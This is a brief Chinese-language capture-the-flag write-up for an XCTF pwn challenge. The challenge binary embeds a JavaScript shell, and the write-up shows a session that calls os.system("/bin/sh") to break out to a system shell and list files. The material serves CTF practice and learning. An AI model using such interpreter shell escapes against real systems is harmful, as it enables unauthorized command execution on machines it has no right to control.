本题引入了js库，估计为js语言解释器

本题考察jsshell
它的os.system()很有用

dudu@kali:~/桌面/learn/pwn/xctf/进阶/money$ ./js
js> ls
typein:1:1 ReferenceError: ls is not defined
Stack:
  @typein:1:1
js> os.system("/bin/sh")
$ ls
js  libnspr4.so  libplc4.so  libplds4.so
$ 
